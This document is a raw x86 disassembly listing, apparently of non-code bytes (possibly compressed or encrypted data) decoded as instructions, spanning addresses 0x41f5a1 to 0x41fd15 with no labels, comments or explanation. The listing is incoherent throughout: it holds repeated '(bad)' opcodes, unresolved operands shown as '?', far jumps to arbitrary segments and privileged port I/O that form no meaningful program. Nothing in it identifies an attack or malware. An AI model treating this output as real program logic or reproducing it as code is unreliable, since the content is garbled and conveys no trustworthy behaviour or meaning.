  41f5a1:	jge    0x41f568
  41f5a3:	pop    ss
  41f5a4:	push   cs
  41f5a5:	pop    edx
  41f5a6:	push   ecx
  41f5a7:	or     DWORD PTR [eax-0x6b93dea2],ecx
  41f5ad:	retf   0x3e7a
  41f5b0:	jecxz  0x41f5b8
  41f5b2:	sub    ch,bl
  41f5b4:	mov    bl,0x71
  41f5b6:	ins    DWORD PTR es:[edi],dx
  41f5b7:	xchg   edi,eax
  41f5b8:	pop    DWORD PTR [ecx]
  41f5ba:	addr16 push ecx
  41f5bc:	dec    ebx
  41f5bd:	xchg   ecx,eax
  41f5be:	lods   al,BYTE PTR ds:[esi]
  41f5bf:	push   DWORD PTR [ecx-0x2d]
  41f5c2:	push   ss
  41f5c3:	jno    0x41f545
  41f5c5:	xor    al,0x9d
  41f5c7:	xor    al,BYTE PTR [edi-0x618737dd]
  41f5cd:	mov    BYTE PTR [ecx+0xf1c064c],0xb3
  41f5d4:	repnz inc ebx
  41f5d6:	mov    BYTE PTR [edi-0x7ac7279f],bh
  41f5dc:	aaa    
  41f5dd:	std    
  41f5de:	xor    al,0x7f
  41f5e0:	or     edx,DWORD PTR [eax+ebx*1]
  41f5e3:	in     eax,dx
  41f5e4:	rcl    DWORD PTR [ecx],cl
  41f5e6:	mov    edi,0xe7f5265c
  41f5eb:	cmp    BYTE PTR [ebp+ecx*1-0x7bb2c0bb],0x8
  41f5f3:	or     edi,DWORD PTR [eax]
  41f5f5:	adc    eax,ebp
  41f5f7:	jmp    0x41f672
  41f5f9:	test   eax,0x20b55ff5
  41f5fe:	push   eax
  41f5ff:	xchg   ebp,eax
  41f600:	sbb    eax,0x3a24747c
  41f605:	sub    eax,0xbd818048
  41f60a:	sbb    ebx,DWORD PTR [ebp-0x5]
  41f60d:	fwait
  41f60e:	inc    esi
  41f60f:	mov    al,ds:0xed1e7570
  41f614:	adc    ecx,ebp
  41f616:	mov    ecx,0x2213bea5
  41f61b:	(bad)  
  41f61d:	adc    ebx,DWORD PTR [ebx]
  41f61f:	cld    
  41f620:	ret    0x2cf0
  41f623:	adc    DWORD PTR [edi],esi
  41f625:	sub    esi,DWORD PTR [ebp+0x24c438c]
  41f62b:	inc    edx
  41f62c:	mov    BYTE PTR [ebx+edx*4],cl
  41f62f:	hlt    
  41f630:	jp     0x41f5df
  41f632:	shl    BYTE PTR [eax-0x34],1
  41f635:	push   eax
  41f636:	xchg   esi,eax
  41f637:	jmp    0x8bb7a33e
  41f63c:	sbb    al,0x56
  41f63e:	sbb    DWORD PTR [edx],edi
  41f640:	or     DWORD PTR ds:0x95437722,ebp
  41f646:	or     dl,BYTE PTR [eax]
  41f648:	dec    ecx
  41f649:	jne    0x41f5f9
  41f64b:	add    DWORD PTR [esi+0x25fbc74e],ebp
  41f651:	inc    ebx
  41f652:	fcom   QWORD PTR [edi]
  41f654:	in     al,dx
  41f655:	ret    
  41f656:	and    DWORD PTR [ebp-0xc],0xffffff88
  41f65a:	aas    
  41f65b:	and    ebx,esp
  41f65d:	inc    esp
  41f65e:	and    al,0xec
  41f660:	add    dh,BYTE PTR [ebx+ebx*8-0x40dd729a]
  41f667:	xor    al,0xa5
  41f669:	stos   BYTE PTR es:[edi],al
  41f66a:	stos   DWORD PTR es:[edi],eax
  41f66b:	pop    edx
  41f66c:	mov    al,ds:0x69d7e132
  41f671:	xchg   BYTE PTR [ebx],ch
  41f673:	push   edi
  41f674:	fs aas 
  41f676:	and    BYTE PTR [edi-0xa10f5f0],ah
  41f67c:	ins    DWORD PTR es:[edi],dx
  41f67d:	ret    0xc764
  41f680:	adc    eax,0xf589d0f3
  41f685:	mov    al,ds:0x9b4eef6b
  41f68a:	push   edx
  41f68b:	out    0xec,al
  41f68d:	mov    edi,DWORD PTR [ebx]
  41f68f:	shr    DWORD PTR [ebx+edx*8+0x16bfa60],1
  41f696:	lods   eax,DWORD PTR ds:[esi]
  41f697:	xor    ch,BYTE PTR [eax]
  41f699:	std    
  41f69a:	jl     0x41f687
  41f69c:	and    dl,BYTE PTR [esi+0x26db2477]
  41f6a2:	aam    0xf1
  41f6a4:	jno    0x41f662
  41f6a6:	leave  
  41f6a7:	out    dx,eax
  41f6a8:	sub    ecx,DWORD PTR [ecx]
  41f6aa:	pop    es
  41f6ab:	sub    al,0x9d
  41f6ad:	xor    eax,0xd8a829d2
  41f6b2:	lods   al,BYTE PTR ds:[esi]
  41f6b3:	and    BYTE PTR ds:0x147df159,0x97
  41f6ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6bb:	dec    eax
  41f6bc:	xor    al,0x1f
  41f6be:	add    DWORD PTR [ebx+edx*1+0x337feb2],eax
  41f6c5:	into   
  41f6c6:	test   al,0x75
  41f6c8:	sbb    BYTE PTR [ecx],dh
  41f6ca:	arpl   WORD PTR [ecx+0x5ddde3f5],dx
  41f6d0:	sub    eax,esi
  41f6d2:	mov    dh,0x74
  41f6d4:	xor    edx,DWORD PTR [ecx+0x16]
  41f6d7:	pop    es
  41f6d8:	nop    DWORD PTR [ecx+0x6f676f65]
  41f6df:	jp     0x41f6c4
  41f6e1:	(bad)  
  41f6e3:	dec    esp
  41f6e4:	dec    ebx
  41f6e5:	ds pop esp
  41f6e7:	mov    ecx,0xf02cb429
  41f6ec:	mov    edi,0x4214df60
  41f6f1:	sub    eax,0x61f04391
  41f6f6:	xchg   ebx,eax
  41f6f7:	and    DWORD PTR [ecx],0xe3ead99
  41f6fd:	sbb    ecx,DWORD PTR [eax+0x2068324]
  41f703:	test   eax,0x6370e914
  41f708:	(bad)  
  41f709:	jno    0x41f6e3
  41f70b:	cmp    bl,BYTE PTR [ecx-0x49a09718]
  41f711:	mov    DWORD PTR [edx+ebp*1-0x7d],ebx
  41f715:	pop    ebp
  41f716:	test   eax,0x14a5c218
  41f71b:	cdq    
  41f71c:	jne    0x41f6b1
  41f71e:	adc    DWORD PTR [esi+0x56],ecx
  41f721:	data16 cld 
  41f723:	sub    ebx,DWORD PTR [ebp-0x13]
  41f726:	adc    eax,0x4510d63
  41f72b:	imul   eax,DWORD PTR [ecx+eiz*1+0x7d],0xab0379a6
  41f733:	xchg   edx,eax
  41f734:	mov    esi,0xd42d2d55
  41f739:	lds    esp,FWORD PTR [esi+ebx*8-0xf827ca5]
  41f740:	test   DWORD PTR [esi-0x30],0x4f201a9d
  41f747:	jo     0x41f788
  41f749:	pushf  
  41f74a:	sbb    eax,0x3e1a60f3
  41f74f:	xchg   eax,edi
  41f751:	jne    0x41f6ee
  41f753:	lock mov ch,al
  41f756:	inc    ebp
  41f757:	push   DWORD PTR [eax]
  41f759:	imul   DWORD PTR [esi+0x24]
  41f75c:	ds shr bh,0x2e
  41f760:	inc    eax
  41f761:	nop
  41f762:	add    eax,0x672c1dda
  41f767:	neg    ch
  41f769:	dec    BYTE PTR [ebx+0x4fefd19f]
  41f76f:	push   es
  41f770:	push   ss
  41f771:	(bad)  
  41f772:	imul   DWORD PTR [ebx]
  41f774:	cmp    cl,BYTE PTR [edx+0x3d583305]
  41f77a:	push   ecx
  41f77b:	pop    edx
  41f77c:	popa   
  41f77d:	jo     0x41f73d
  41f77f:	or     edx,ebp
  41f781:	imul   esp,DWORD PTR [ebx],0x40
  41f784:	pop    edi
  41f785:	ror    BYTE PTR [edx],cl
  41f787:	pop    ebp
  41f788:	popf   
  41f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f78a:	sbb    al,0x7f
  41f78c:	inc    ebx
  41f78d:	or     eax,0x885a855b
  41f792:	iret   
  41f793:	dec    ebx
  41f794:	mov    al,ds:0x52c2c4b0
  41f799:	xchg   esi,eax
  41f79a:	mov    eax,ds:0x14b53e36
  41f79f:	push   0x5b
  41f7a1:	sub    bh,BYTE PTR [edi]
  41f7a3:	sbb    DWORD PTR [esi-0x74da2fdc],ebp
  41f7a9:	jmp    0x41f74b
  41f7ab:	xchg   edi,eax
  41f7ac:	into   
  41f7ad:	sub    edx,esp
  41f7af:	lods   eax,DWORD PTR ds:[esi]
  41f7b0:	sahf   
  41f7b1:	sbb    DWORD PTR [esi+0x68af84ce],edi
  41f7b7:	jns    0x41f77f
  41f7b9:	loop   0x41f826
  41f7bb:	clc    
  41f7bc:	lods   al,BYTE PTR ds:[si]
  41f7be:	xor    al,0x7e
  41f7c0:	dec    ebp
  41f7c1:	mov    edi,0x22ca81f2
  41f7c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7c7:	cli    
  41f7c8:	inc    ebp
  41f7c9:	bound  ecx,QWORD PTR [ebx+0x2bee168a]
  41f7cf:	(bad)  
  41f7d0:	shl    DWORD PTR [edi-0x36],1
  41f7d3:	mov    ds:0x1ecea66d,eax
  41f7d8:	(bad)  [ecx+0x44]
  41f7db:	adc    al,0x59
  41f7dd:	and    ebx,DWORD PTR [edi]
  41f7df:	int3   
  41f7e0:	sbb    bh,dh
  41f7e2:	loopne 0x41f818
  41f7e4:	jl     0x41f81f
  41f7e6:	inc    ecx
  41f7e7:	bound  ebx,QWORD PTR [edx-0x46]
  41f7ea:	lods   al,BYTE PTR ds:[esi]
  41f7eb:	and    DWORD PTR [ebx+0x2a6bec5c],eax
  41f7f1:	bound  esp,QWORD PTR [ecx]
  41f7f3:	push   ecx
  41f7f4:	inc    edi
  41f7f5:	stc    
  41f7f6:	dec    edi
  41f7f7:	stos   DWORD PTR es:[edi],eax
  41f7f8:	jmp    0x3137c9b7
  41f7fd:	stos   DWORD PTR es:[edi],eax
  41f7fe:	or     eax,DWORD PTR [edx+esi*2-0x20]
  41f802:	push   es
  41f803:	js     0x41f846
  41f805:	inc    ecx
  41f806:	rcr    DWORD PTR [ebx],1
  41f808:	mov    bh,cl
  41f80a:	jae    0x41f84e
  41f80c:	inc    eax
  41f80d:	es mov dl,0x13
  41f810:	xchg   BYTE PTR [esi+0x5d],bl
  41f813:	rol    BYTE PTR [eax+esi*4],1
  41f816:	pop    esi
  41f817:	xchg   DWORD PTR [esi+0x8],esi
  41f81a:	inc    esp
  41f81b:	pop    edi
  41f81c:	test   eax,0x6ba3edf8
  41f821:	cld    
  41f822:	bound  esi,QWORD PTR [esi+0x6df1a73f]
  41f828:	and    bl,ah
  41f82a:	dec    esp
  41f82b:	sub    BYTE PTR [eax+0x3d],cl
  41f82e:	inc    esp
  41f82f:	jne    0x41f877
  41f831:	and    ebp,DWORD PTR [esi+eax*1-0x3fda18e]
  41f838:	test   al,0x95
  41f83a:	daa    
  41f83b:	dec    si
  41f83d:	nop
  41f83e:	popa   
  41f83f:	fsub   QWORD PTR [esi+0xaee77ba]
  41f845:	nop
  41f846:	out    0x92,al
  41f848:	sbb    ecx,edx
  41f84a:	push   ebp
  41f84b:	icebp  
  41f84c:	fs dec ecx
  41f84e:	ret    0x3d7e
  41f851:	mov    DWORD PTR [edx+0xd1c143a],esp
  41f857:	dec    eax
  41f858:	rcr    BYTE PTR [esp+ebx*2+0x23],1
  41f85c:	pop    ss
  41f85d:	mov    BYTE PTR [esi+0x5f78ef67],bl
  41f863:	cs pop ecx
  41f865:	mov    ch,0xe8
  41f867:	mov    esi,0x83d7b929
  41f86c:	pop    esp
  41f86d:	jmp    0x975c:0xa50998be
  41f874:	fild   DWORD PTR [esp+eax*4]
  41f877:	fstp   DWORD PTR [ebx]
  41f879:	jecxz  0x41f8b6
  41f87b:	ret    
  41f87c:	jbe    0x41f821
  41f87e:	setae  al
  41f881:	mov    ecx,ecx
  41f883:	pop    ds
  41f884:	mov    al,ds:0x265344fa
  41f889:	int    0x8f
  41f88b:	and    BYTE PTR [ebp+ebp*8-0x78],cl
  41f88f:	mov    dh,0xa0
  41f891:	ror    cl,0x7c
  41f894:	ja     0x41f850
  41f896:	test   BYTE PTR gs:[ebp-0x4],bh
  41f89a:	(bad)  
  41f89b:	imul   esp,DWORD PTR [esi],0x53bd7c0e
  41f8a1:	int3   
  41f8a2:	sbb    ecx,ebp
  41f8a4:	fs and edx,ebp
  41f8a7:	cmp    esi,esi
  41f8a9:	es in  al,dx
  41f8ab:	xchg   ecx,eax
  41f8ac:	ja     0x41f8a9
  41f8ae:	and    al,0xca
  41f8b0:	and    eax,0x49e738bc
  41f8b5:	loope  0x41f869
  41f8b7:	fcomi  st,st(1)
  41f8b9:	sub    al,0xb3
  41f8bb:	cwde   
  41f8bc:	jp     0x41f931
  41f8be:	jbe    0x41f885
  41f8c0:	das    
  41f8c1:	xchg   esp,eax
  41f8c2:	popa   
  41f8c3:	sub    BYTE PTR [ebp-0x55],cl
  41f8c6:	cmp    eax,0xa80932aa
  41f8cb:	div    bh
  41f8cd:	out    0x1b,eax
  41f8cf:	enter  0xf340,0x3b
  41f8d3:	mov    edx,0xf2b3e51e
  41f8d8:	lahf   
  41f8d9:	mov    eax,ebp
  41f8db:	sub    BYTE PTR [esi+0x46],al
  41f8de:	jmp    0x7f41b087
  41f8e3:	jb     0x41f91a
  41f8e5:	pop    es
  41f8e6:	push   ebp
  41f8e7:	into   
  41f8e8:	inc    edi
  41f8e9:	stos   BYTE PTR es:[edi],al
  41f8ea:	sar    DWORD PTR [esi+0x5389e525],0xc5
  41f8f1:	jecxz  0x41f8fb
  41f8f3:	jecxz  0x41f953
  41f8f5:	xchg   ebx,eax
  41f8f6:	fdivr  st(1),st
  41f8f8:	xor    BYTE PTR [esi-0x6e],dh
  41f8fb:	and    al,0x6d
  41f8fd:	mov    dl,0x11
  41f8ff:	(bad)  
  41f900:	jo     0x41f925
  41f902:	push   ds
  41f903:	cmp    ah,al
  41f905:	lods   al,BYTE PTR ds:[esi]
  41f906:	stos   DWORD PTR es:[edi],eax
  41f907:	mov    ds,WORD PTR [edi+eiz*2-0x33b21cc3]
  41f90e:	pop    esp
  41f90f:	xlat   BYTE PTR ds:[ebx]
  41f910:	mov    ?,WORD PTR [eax]
  41f912:	sahf   
  41f913:	dec    ebx
  41f914:	xor    DWORD PTR [eax],eax
  41f916:	mov    ss,WORD PTR ds:0xa9aca90c
  41f91c:	stos   BYTE PTR es:[edi],al
  41f91d:	sub    DWORD PTR [esi],esi
  41f91f:	rcr    ebx,cl
  41f921:	push   edx
  41f922:	js     0x41f946
  41f924:	cmp    BYTE PTR [ebp-0x78ecd0f3],ch
  41f92a:	in     eax,0xd5
  41f92c:	fisubr WORD PTR [edi]
  41f92e:	das    
  41f92f:	lods   eax,DWORD PTR ds:[esi]
  41f930:	jge    0x41f8ea
  41f932:	out    0x79,eax
  41f934:	cmp    bh,al
  41f936:	adc    DWORD PTR [ecx],esi
  41f938:	cld    
  41f939:	sbb    DWORD PTR [ebp+0x7bf50d2f],esi
  41f93f:	or     dh,BYTE PTR [ebp+0x34f18de]
  41f945:	bound  ecx,QWORD PTR [edx]
  41f947:	shr    BYTE PTR [esi-0x308882e9],cl
  41f94d:	adc    al,ch
  41f94f:	retf   
  41f950:	cmp    ch,0x12
  41f953:	scas   al,BYTE PTR es:[edi]
  41f954:	jge    0x41f936
  41f956:	rcl    DWORD PTR [ebx+0x1a],1
  41f959:	pop    esi
  41f95a:	fwait
  41f95b:	fwait
  41f95c:	sub    bh,BYTE PTR [ecx-0x4b]
  41f95f:	(bad)  [ecx+esi*2]
  41f962:	shl    bh,1
  41f964:	(bad)  
  41f965:	cmp    BYTE PTR [ecx+0x6a03433b],ah
  41f96b:	fiadd  WORD PTR [eax+edi*4]
  41f96e:	test   edi,edx
  41f970:	mov    gs,WORD PTR [eax-0x60]
  41f973:	jl     0x41f94e
  41f975:	push   eax
  41f976:	or     DWORD PTR [edx+0x3f6d4416],ebx
  41f97c:	xchg   DWORD PTR [esp+edx*1+0x4e],esp
  41f980:	pop    edx
  41f981:	cmp    eax,0xda569e33
  41f986:	sub    esi,DWORD PTR [esi]
  41f988:	dec    esi
  41f989:	out    0x91,al
  41f98b:	jmp    0x8cb0:0x11e59665
  41f992:	lea    ecx,[ecx-0x2e1db880]
  41f998:	xchg   esp,eax
  41f999:	imul   edx,eax,0x6df3a06e
  41f99f:	mov    cl,0xcb
  41f9a1:	push   ds
  41f9a2:	cmp    ch,al
  41f9a4:	mov    eax,ds:0xfb06328a
  41f9a9:	das    
  41f9aa:	pop    esp
  41f9ab:	or     dl,BYTE PTR [edx-0x7fdddd30]
  41f9b1:	add    DWORD PTR ds:0xea957774,0x42
  41f9b8:	mov    ebp,0x304e3640
  41f9bd:	sbb    ecx,DWORD PTR [edi-0x35f33ada]
  41f9c3:	inc    esi
  41f9c4:	call   0xd5df8b5d
  41f9c9:	or     ah,ah
  41f9cb:	mov    esp,0xd07ad9d6
  41f9d0:	push   esp
  41f9d1:	pusha  
  41f9d2:	test   eax,0x404e5027
  41f9d7:	pop    edi
  41f9d8:	xor    BYTE PTR [ebx-0x4f67196],dl
  41f9de:	inc    edi
  41f9df:	xor    bl,BYTE PTR [ebp+0x17379faf]
  41f9e5:	xor    eax,0xffef1f59
  41f9ea:	add    eax,0x18b5e82c
  41f9ef:	xor    BYTE PTR [esi],cl
  41f9f1:	fcomp  st(2)
  41f9f3:	stc    
  41f9f4:	div    DWORD PTR [eax]
  41f9f6:	dec    edx
  41f9f7:	sti    
  41f9f8:	mov    al,0x8c
  41f9fa:	jle    0x41f9c6
  41f9fc:	jmp    DWORD PTR [edi+0x18dc8311]
  41fa02:	sub    al,0xa7
  41fa04:	cwde   
  41fa05:	mov    ebp,0x43c39a0
  41fa0a:	push   es
  41fa0b:	dec    edi
  41fa0c:	inc    edx
  41fa0d:	shr    DWORD PTR [esp+eax*1],cl
  41fa10:	xor    DWORD PTR ds:0xc0a8aab4,ecx
  41fa16:	(bad)  
  41fa18:	xor    BYTE PTR [ecx+0x388f318a],cl
  41fa1e:	adc    dh,BYTE PTR [edx]
  41fa20:	aas    
  41fa21:	ret    
  41fa22:	push   esi
  41fa23:	and    eax,0x55dc762
  41fa28:	out    dx,eax
  41fa29:	pop    edx
  41fa2a:	ja     0x41fa6a
  41fa2c:	or     eax,0x24276c51
  41fa31:	outs   dx,DWORD PTR ds:[esi]
  41fa32:	dec    edi
  41fa33:	enter  0x8354,0x17
  41fa37:	test   eax,0x69ca6e90
  41fa3c:	adc    ch,al
  41fa3e:	add    dl,cl
  41fa40:	rdpmc  
  41fa42:	cmp    DWORD PTR [edx+esi*8-0x35],edx
  41fa46:	pop    ecx
  41fa47:	ror    dh,1
  41fa49:	cmp    eax,0x86b3255c
  41fa4e:	sti    
  41fa4f:	div    DWORD PTR [ebx+0x2572c95f]
  41fa55:	out    dx,eax
  41fa56:	xchg   edx,eax
  41fa57:	and    bl,dh
  41fa59:	stc    
  41fa5a:	test   eax,0x6aa3004a
  41fa5f:	call   0x3587:0x5a534419
  41fa66:	jns    0x41fa41
  41fa68:	and    bl,BYTE PTR [ecx]
  41fa6a:	jmp    FWORD PTR [edi+0x76]
  41fa6d:	dec    ebp
  41fa6e:	call   0xdb1690ba
  41fa73:	xchg   BYTE PTR [ebp+eax*8+0x225d5db6],cl
  41fa7a:	fdivr  st,st(3)
  41fa7c:	sub    al,0xf7
  41fa7e:	into   
  41fa7f:	push   ebp
  41fa80:	jb     0x41fab9
  41fa82:	js     0x41fa30
  41fa84:	(bad)  
  41fa85:	pop    ds
  41fa86:	(bad)  
  41fa87:	(bad)  
  41fa89:	pusha  
  41fa8a:	sub    DWORD PTR [ebp+0x31],eax
  41fa8d:	mov    ebx,0xfc9b2863
  41fa92:	clc    
  41fa93:	xor    edi,DWORD PTR [eax]
  41fa95:	js     0x41fae1
  41fa97:	xchg   ebp,eax
  41fa98:	loopne 0x41fa80
  41fa9a:	hlt    
  41fa9b:	mov    WORD PTR [ebp-0x2a],gs
  41fa9e:	push   edx
  41fa9f:	(bad)  
  41faa1:	pop    esi
  41faa2:	and    DWORD PTR [ebx+edx*2-0x68],esp
  41faa6:	out    0xeb,eax
  41faa8:	sub    eax,0xa62d4efa
  41faad:	cwde   
  41faae:	mov    ds:0x8768c085,al
  41fab3:	mov    BYTE PTR [ecx+0x18a967b4],ch
  41fab9:	pop    ss
  41faba:	int3   
  41fabb:	pop    esi
  41fabc:	or     al,0x20
  41fabe:	cmc    
  41fabf:	push   edx
  41fac0:	loope  0x41fab7
  41fac2:	popa   
  41fac3:	shl    bh,0xd6
  41fac6:	lock stos DWORD PTR es:[edi],eax
  41fac8:	stos   DWORD PTR es:[edi],eax
  41fac9:	das    
  41faca:	xchg   esi,eax
  41facb:	or     eax,DWORD PTR [edx+0x36ac7702]
  41fad1:	push   edi
  41fad2:	xchg   edi,eax
  41fad3:	cmp    ch,BYTE PTR [eax+0x51]
  41fad6:	add    eax,DWORD PTR [esi+0x11]
  41fad9:	jge    0x41fb55
  41fadb:	aad    0x15
  41fadd:	xor    BYTE PTR [edx+0xc],al
  41fae0:	mov    edi,0xb13051d
  41fae5:	sbb    BYTE PTR [eax+0x6d],al
  41fae8:	fwait
  41fae9:	repz xchg ebp,eax
  41faeb:	and    eax,0xdecc5085
  41faf0:	jge    0x41faec
  41faf2:	sti    
  41faf3:	repz add al,BYTE PTR [esp+eiz*8-0x6f9e864e]
  41fafb:	(bad)  
  41fafc:	mov    es,edi
  41fafe:	inc    ebx
  41faff:	mov    ?,WORD PTR ds:0xabd27f46
  41fb05:	popa   
  41fb06:	inc    ebp
  41fb07:	iret   
  41fb08:	idiv   BYTE PTR [ebx-0x51]
  41fb0b:	outs   dx,BYTE PTR ds:[esi]
  41fb0c:	es mov ebp,0x64b6b670
  41fb12:	xchg   BYTE PTR [ebx-0x4696e580],dl
  41fb18:	push   ss
  41fb19:	xchg   DWORD PTR [edi-0x49fb5403],esp
  41fb1f:	(bad)  
  41fb21:	push   ds
  41fb22:	repz cmp ah,cl
  41fb25:	xchg   esi,eax
  41fb26:	loope  0x41fb9e
  41fb28:	and    DWORD PTR [edi+esi*4],0xffffff96
  41fb2c:	push   cs
  41fb2d:	jnp    0x41fb40
  41fb2f:	fdivr  QWORD PTR ds:0xa055ae32
  41fb35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb36:	pusha  
  41fb37:	ror    al,cl
  41fb39:	jne    0x41fba3
  41fb3b:	push   ss
  41fb3c:	cmp    al,BYTE PTR [bx+si]
  41fb3f:	xchg   dl,cl
  41fb41:	jmp    0xd12fec6b
  41fb46:	arpl   WORD PTR [ebp-0x15],di
  41fb49:	pop    es
  41fb4a:	add    eax,ecx
  41fb4c:	mov    edx,0x5c79da1f
  41fb51:	leave  
  41fb52:	push   cs
  41fb53:	cmp    ebx,edi
  41fb55:	inc    eax
  41fb56:	mov    ds:0x2cca0b1e,eax
  41fb5b:	sbb    BYTE PTR [eax-0x63],0xef
  41fb5f:	dec    ebx
  41fb60:	xor    DWORD PTR [ebx+0x1f],0xa5740530
  41fb67:	loope  0x41fb07
  41fb69:	call   DWORD PTR [edx-0x4e]
  41fb6c:	nop
  41fb6d:	inc    edx
  41fb6e:	jmp    0x41fb4f
  41fb70:	aad    0x7d
  41fb72:	inc    esi
  41fb73:	pop    ds
  41fb74:	mov    dl,BYTE PTR [edi]
  41fb76:	imul   edi,DWORD PTR [ebx],0xfffffffb
  41fb79:	int3   
  41fb7a:	pop    esi
  41fb7b:	jae    0x41fb59
  41fb7d:	cld    
  41fb7e:	std    
  41fb7f:	outs   dx,DWORD PTR ds:[esi]
  41fb80:	cmp    DWORD PTR [edi+edi*2],0x4f
  41fb84:	arpl   WORD PTR ds:0xfbc61952,bx
  41fb8a:	inc    esp
  41fb8b:	jle    0x41fb0d
  41fb8d:	fadd   QWORD PTR ds:[esi]
  41fb90:	pop    ds
  41fb91:	dec    esi
  41fb92:	sbb    dh,BYTE PTR es:[esi-0x51]
  41fb96:	adc    edx,DWORD PTR [edx-0x17]
  41fb99:	icebp  
  41fb9a:	call   0xa5e3c8ef
  41fb9f:	ret    
  41fba0:	xchg   esi,eax
  41fba1:	add    eax,0xa907266a
  41fba6:	mov    edi,0xcb637064
  41fbab:	loope  0x41fb45
  41fbad:	jecxz  0x41fc28
  41fbaf:	adc    al,0x56
  41fbb1:	push   edx
  41fbb2:	in     al,0x2f
  41fbb4:	shr    BYTE PTR [edi+0x65d99360],0xb6
  41fbbb:	stos   BYTE PTR es:[edi],al
  41fbbc:	mov    ebx,0xf4effa06
  41fbc1:	push   cs
  41fbc2:	cmp    al,bl
  41fbc4:	repnz sbb BYTE PTR [eax-0x63dcbb18],0x40
  41fbcc:	push   esp
  41fbcd:	jmp    0x5417444e
  41fbd2:	mov    ds:0x33adf12e,eax
  41fbd7:	jae    0x41fb73
  41fbd9:	cmp    eax,0x185c40cf
  41fbde:	pusha  
  41fbdf:	stc    
  41fbe0:	inc    esi
  41fbe1:	out    dx,eax
  41fbe2:	mov    ebp,DWORD PTR ds:0x9ab55012
  41fbe8:	sub    BYTE PTR [ecx],0xfc
  41fbeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbec:	mov    cl,0xef
  41fbee:	sub    BYTE PTR [ebx-0x280d57fa],0x26
  41fbf5:	test   BYTE PTR [ecx+0x15],bl
  41fbf8:	repz sbb al,0x2c
  41fbfb:	aas    
  41fbfc:	xor    eax,0xf3e122af
  41fc01:	call   0x2262:0xe528e29b
  41fc08:	or     al,0xc
  41fc0a:	dec    eax
  41fc0b:	xchg   edx,edx
  41fc0d:	cmovbe edi,DWORD PTR [ebx+0x5adef3bd]
  41fc14:	inc    ecx
  41fc15:	adc    al,0xec
  41fc17:	xor    dh,al
  41fc19:	fstp   DWORD PTR [esi+0x50]
  41fc1c:	mov    dl,0x5b
  41fc1e:	jmp    0xd7d0baa1
  41fc23:	sahf   
  41fc24:	(bad)  
  41fc25:	cmc    
  41fc26:	cmp    ah,dh
  41fc28:	mov    ebx,0xb1f007c1
  41fc2d:	cmc    
  41fc2e:	inc    edi
  41fc2f:	dec    edx
  41fc30:	mov    bl,0x54
  41fc32:	nop
  41fc33:	jmp    0x41fc41
  41fc35:	sti    
  41fc36:	iret   
  41fc37:	xor    al,0x3f
  41fc39:	mov    edx,0x9d975a1f
  41fc3e:	das    
  41fc3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc40:	mov    ebx,DWORD PTR [eax]
  41fc42:	adc    eax,0xc8d90dfd
  41fc47:	xor    ax,0xbb80
  41fc4b:	xchg   edi,eax
  41fc4c:	mov    dl,0x9f
  41fc4e:	shl    DWORD PTR ss:[edx+edi*8],0xd2
  41fc53:	fdiv   st(5),st
  41fc55:	jge    0x41fc08
  41fc57:	and    al,0x3c
  41fc59:	mov    dl,0xcb
  41fc5b:	in     al,dx
  41fc5c:	sar    DWORD PTR [edi+eiz*4],0xf2
  41fc60:	in     al,0xfb
  41fc62:	jno    0x41fc0c
  41fc64:	sbb    BYTE PTR [eax+0x2a],dh
  41fc67:	ja     0x41fcc8
  41fc69:	fwait
  41fc6a:	pop    edi
  41fc6b:	mov    eax,0x55b091ef
  41fc70:	fidiv  WORD PTR [ecx]
  41fc72:	push   ebx
  41fc73:	aam    0x4f
  41fc75:	mov    esp,DWORD PTR [ecx]
  41fc77:	lods   al,BYTE PTR ds:[esi]
  41fc78:	inc    esi
  41fc79:	push   es
  41fc7a:	mov    ebx,0x58977d89
  41fc7f:	into   
  41fc80:	pop    eax
  41fc81:	mov    eax,0x3c7f1c61
  41fc86:	popa   
  41fc87:	(bad)  
  41fc88:	pusha  
  41fc89:	or     BYTE PTR [ecx+eiz*4+0x43],cl
  41fc8d:	dec    eax
  41fc8e:	scas   eax,DWORD PTR es:[edi]
  41fc8f:	in     eax,0x8c
  41fc91:	mov    DWORD PTR [edx+0x0],eax
  41fc94:	jmp    0x260c:0x9b35cc67
  41fc9b:	cmp    bh,bh
  41fc9d:	(bad)  
  41fc9e:	mov    WORD PTR ds:0x7a280a68,ss
  41fca4:	mov    bl,ah
  41fca6:	push   ecx
  41fca7:	scas   eax,DWORD PTR es:[edi]
  41fca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fca9:	ins    DWORD PTR es:[edi],dx
  41fcaa:	ret    0x7560
  41fcad:	daa    
  41fcae:	shr    edi,cl
  41fcb0:	and    ah,0x5d
  41fcb3:	sbb    dh,bh
  41fcb5:	mov    WORD PTR [ecx-0x6815ce7c],?
  41fcbb:	push   edx
  41fcbc:	add    eax,0x4e9f4781
  41fcc1:	and    BYTE PTR [esi+0x77c589e9],ch
  41fcc7:	aaa    
  41fcc8:	mov    ecx,0xb4bd34a6
  41fccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcce:	out    dx,eax
  41fccf:	outs   dx,DWORD PTR ds:[esi]
  41fcd0:	sub    ebx,DWORD PTR [ecx]
  41fcd2:	mov    ch,0x16
  41fcd4:	ret    0x7c0e
  41fcd7:	jle    0x41fd20
  41fcd9:	mov    edi,DWORD PTR [ebp-0x730bc43b]
  41fcdf:	or     BYTE PTR [edx-0x2b],bl
  41fce2:	sbb    ecx,DWORD PTR [esi+0x65]
  41fce5:	sti    
  41fce6:	daa    
  41fce7:	emms   
  41fce9:	leave  
  41fcea:	loop   0x41fd6a
  41fcec:	stos   DWORD PTR es:[edi],eax
  41fced:	bound  ebp,QWORD PTR [eax-0x2]
  41fcf0:	ds clc 
  41fcf2:	gs xchg ebx,eax
  41fcf4:	adc    BYTE PTR [ebx-0x2f0a85a2],0x2c
  41fcfb:	push   esp
  41fcfc:	scas   al,BYTE PTR es:[edi]
  41fcfd:	push   edi
  41fcfe:	xchg   edi,eax
  41fcff:	lahf   
  41fd00:	or     eax,0x33777b40
  41fd05:	(bad)  
  41fd06:	es mov al,0x73
  41fd09:	jo     0x41fcac
  41fd0b:	sub    ebx,DWORD PTR [edi+0x6e0c5222]
  41fd11:	out    0x1a,eax
  41fd13:	push   0x7b
  41fd15:	push   esi
